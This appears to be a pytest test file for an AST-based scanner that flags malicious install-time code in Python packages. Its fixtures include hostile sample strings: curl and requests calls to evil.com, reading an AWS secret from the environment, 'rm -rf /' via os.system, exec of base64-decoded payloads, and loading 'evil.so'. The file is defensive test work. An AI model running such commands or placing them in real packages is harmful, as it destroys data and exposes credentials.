"""Tests for the AST-based code analyzer (v0.3.1 — Phase 2).

Covers:
- T9: AST Precision Tests — suspicious keywords in comments/strings → zero detections
- AST detection of exec/eval/compile/subprocess/ctypes/os.environ
- Integration with _score_code_patterns (AST + regex combined)
"""

from __future__ import annotations

from pathlib import Path

import pytest

from alterks.ast_analyzer import (
    AST_RULES_VERSION,
    ASTFinding,
    analyze_directory,
    analyze_file,
)


# ---------------------------------------------------------------------------
# AST Rules version
# ---------------------------------------------------------------------------

class TestASTRulesVersion:
    def test_version_is_set(self):
        assert AST_RULES_VERSION == "1.0"


# ---------------------------------------------------------------------------
# analyze_file — Malicious patterns detected
# ---------------------------------------------------------------------------

class TestAnalyzeFileMalicious:
    def test_exec_call(self):
        findings = analyze_file("exec('print(1)')", "setup.py", is_install_time=True)
        assert len(findings) >= 1
        assert any("exec" in f.description for f in findings)
        assert findings[0].severity >= 0.60

    def test_eval_call(self):
        findings = analyze_file("eval('1+1')", "setup.py", is_install_time=True)
        assert len(findings) >= 1
        assert any("eval" in f.description for f in findings)

    def test_exec_with_b64decode(self):
        code = "import base64\nexec(base64.b64decode('abc'))"
        findings = analyze_file(code, "setup.py", is_install_time=True)
        assert len(findings) >= 1
        top = findings[0]
        assert top.severity >= 0.90

    def test_exec_compile(self):
        code = "exec(compile(open('x').read(), 'x', 'exec'))"
        findings = analyze_file(code, "setup.py", is_install_time=True)
        assert len(findings) >= 1
        assert findings[0].severity >= 0.85

    def test_subprocess_popen(self):
        code = "import subprocess\nsubprocess.Popen(['curl', 'http://evil.com'])"
        findings = analyze_file(code, "setup.py", is_install_time=True)
        assert len(findings) >= 1
        assert any("subprocess" in f.description for f in findings)

    def test_ctypes_cdll(self):
        code = "import ctypes\nctypes.cdll.LoadLibrary('evil.so')"
        findings = analyze_file(code, "setup.py", is_install_time=True)
        assert len(findings) >= 1
        assert any("ctypes" in f.description for f in findings)

    def test_os_environ_sensitive(self):
        code = "import os\ntoken = os.environ['AWS_SECRET_KEY']"
        findings = analyze_file(code, "setup.py", is_install_time=True)
        assert len(findings) >= 1
        assert any("environ" in f.description.lower() or "env var" in f.description.lower()
                    for f in findings)

    def test_network_call_in_setup(self):
        code = "import requests\nrequests.get('http://evil.com')"
        findings = analyze_file(code, "setup.py", is_install_time=True)
        assert len(findings) >= 1
        assert any("Network" in f.description or "requests" in f.description
                    for f in findings)

    def test_network_call_in_init_not_flagged(self):
        """Network calls in __init__.py (not install-time) should not flag."""
        code = "import requests\nrequests.get('https://api.example.com')"
        findings = analyze_file(code, "__init__.py", is_install_time=False)
        network_findings = [f for f in findings if "Network" in f.description
                            or "requests" in f.description]
        assert len(network_findings) == 0

    def test_dunder_import(self):
        code = "__import__('os').system('rm -rf /')"
        findings = analyze_file(code, "setup.py", is_install_time=True)
        assert len(findings) >= 1

    def test_os_system_call(self):
        code = "import os\nos.system('rm -rf /')"
        findings = analyze_file(code, "setup.py", is_install_time=True)
        assert len(findings) >= 1
        assert any("os.system" in f.description for f in findings)


# ---------------------------------------------------------------------------
# T9: AST Precision Tests — comments and string literals
# ---------------------------------------------------------------------------

class TestASTPrecision:
    """Supply code where suspicious keywords appear only in comments or
    string literals. Assert zero detections from the AST analyzer."""

    def test_exec_in_comment(self):
        code = "# exec(base64.b64decode('malicious'))\nx = 1"
        findings = analyze_file(code, "setup.py", is_install_time=True)
        assert len(findings) == 0

    def test_exec_in_docstring(self):
        code = '"""\nexec(base64.b64decode("payload"))\n"""\nx = 1'
        findings = analyze_file(code, "setup.py", is_install_time=True)
        assert len(findings) == 0

    def test_subprocess_in_string_literal(self):
        code = "msg = 'subprocess.Popen is dangerous'\nprint(msg)"
        findings = analyze_file(code, "setup.py", is_install_time=True)
        assert len(findings) == 0

    def test_os_environ_in_comment(self):
        code = "# os.environ['AWS_SECRET_KEY']\nx = 42"
        findings = analyze_file(code, "setup.py", is_install_time=True)
        assert len(findings) == 0

    def test_ctypes_in_docstring(self):
        code = '"""Using ctypes.cdll to load native libs"""\nimport math'
        findings = analyze_file(code, "setup.py", is_install_time=True)
        assert len(findings) == 0

    def test_network_in_comment(self):
        code = "# requests.get('http://evil.com')\nprint('safe')"
        findings = analyze_file(code, "setup.py", is_install_time=True)
        assert len(findings) == 0

    def test_mixed_comments_and_real_code(self):
        """Only the real exec() call should be detected, not the comment."""
        code = (
            "# exec(base64.b64decode('comment'))\n"
            "exec('print(1)')  # this is real\n"
        )
        findings = analyze_file(code, "setup.py", is_install_time=True)
        assert len(findings) == 1
        assert findings[0].line == 2

    def test_syntax_error_returns_empty(self):
        code = "def foo(\n  broken syntax"
        findings = analyze_file(code, "setup.py", is_install_time=True)
        assert len(findings) == 0


# ---------------------------------------------------------------------------
# analyze_directory
# ---------------------------------------------------------------------------

class TestAnalyzeDirectory:
    def test_finds_issues_in_setup_py(self, tmp_path: Path):
        (tmp_path / "setup.py").write_text(
            "exec(compile(open('x').read(), 'x', 'exec'))"
        )
        findings = analyze_directory(tmp_path)
        assert len(findings) >= 1
        assert findings[0].file_path == "setup.py"

    def test_ignores_non_inspectable_files(self, tmp_path: Path):
        (tmp_path / "utils.py").write_text("exec('print(1)')")
        findings = analyze_directory(tmp_path)
        assert len(findings) == 0

    def test_clean_setup(self, tmp_path: Path):
        (tmp_path / "setup.py").write_text(
            "from setuptools import setup\nsetup(name='pkg')\n"
        )
        findings = analyze_directory(tmp_path)
        assert len(findings) == 0

    def test_benign_init(self, tmp_path: Path):
        pkg = tmp_path / "pkg"
        pkg.mkdir()
        (pkg / "__init__.py").write_text("from .core import main\n")
        findings = analyze_directory(tmp_path)
        assert len(findings) == 0


# ---------------------------------------------------------------------------
# Integration: _score_code_patterns with AST
# ---------------------------------------------------------------------------

class TestScoreCodePatternsWithAST:
    def test_ast_detects_exec_in_setup(self, tmp_path: Path):
        """AST should detect exec() and produce a score."""
        from alterks.heuristics import _score_code_patterns
        (tmp_path / "setup.py").write_text("exec('import os')")
        score, reason, path, lines = _score_code_patterns(tmp_path)
        assert score >= 0.60
        assert path is not None

    def test_comment_only_not_flagged_by_ast(self, tmp_path: Path):
        """Exec in a comment: regex might flag it, AST should not."""
        from alterks.heuristics import _score_code_patterns
        # This code has exec only as a comment — no actual call
        (tmp_path / "setup.py").write_text(
            "# exec(base64.b64decode('test'))\n"
            "from setuptools import setup\n"
            "setup(name='pkg')\n"
        )
        score, reason, path, lines = _score_code_patterns(tmp_path)
        # Regex may still flag this, but score should be moderate (not critical)
        # because AST pass finds nothing. We just assert no crash.
        assert score >= 0.0

    def test_code_patterns_version_updated(self):
        from alterks.heuristics import CODE_PATTERNS_VERSION
        # Version should be 1.1 after Phase 2 AST integration
        assert CODE_PATTERNS_VERSION == "1.1"
